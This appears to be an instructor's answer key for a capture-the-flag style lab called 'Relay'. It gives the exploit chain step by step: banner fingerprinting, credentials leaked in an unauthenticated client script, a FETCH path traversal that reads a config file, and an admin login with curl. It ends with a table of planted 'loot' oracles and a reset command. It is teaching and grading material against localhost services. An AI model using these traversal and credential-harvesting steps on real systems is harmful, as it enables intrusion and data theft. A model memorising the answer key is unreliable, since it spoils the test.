# Solution — 10 Relay (hard)

> Spoilers — instructor's answer key.

## Chain

1. **Fingerprint the service.** `nmap` shows an unknown service on `8210`. Connect and read
   the banner — it speaks a custom line protocol:
   ```sh
   ncat 127.0.0.1 8210     # banner: "RELAY/1.0 ready"; try HELO / AUTH / LIST / FETCH
   ```
2. **Recover credentials from the leaked client.** The management console (`:8110`) serves
   `/relay-client.py` with no auth; it documents the verbs and embeds
   `svc-relay / R3lay-svc-9x`.
3. **Path traversal in FETCH.** After `AUTH svc-relay R3lay-svc-9x`, `FETCH` joins its
   argument to the spool dir without sanitisation:
   ```
   AUTH svc-relay R3lay-svc-9x
   FETCH ../config/relay.conf
   ```
   leaks `relay.conf`, which contains the console admin creds
   `relay-admin / M4nage-R3lay-2026` and an API key.
4. **Log in to the console.** `curl -u relay-admin:M4nage-R3lay-2026 http://127.0.0.1:8110/admin`
   returns the **custody vault** (Ridgeway Mutual, Osei & Partners — accounts, custody values).

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `relay-banner` | `RELAY/1.0` | TCP `:8210` banner |
| `leaked-client-creds` | `svc-relay / R3lay-svc-9x` | `GET /relay-client.py` |
| `mgmt-admin-secret` | `M4nage-R3lay-2026` (+ api key) | `FETCH ../config/relay.conf` |
| `custody-vault` | `Ridgeway Mutual`, … | console `/admin` |

## Reset

`make lab-restore LAB=10-hard-relay` (recreate — both services rebuild from baked-in content).
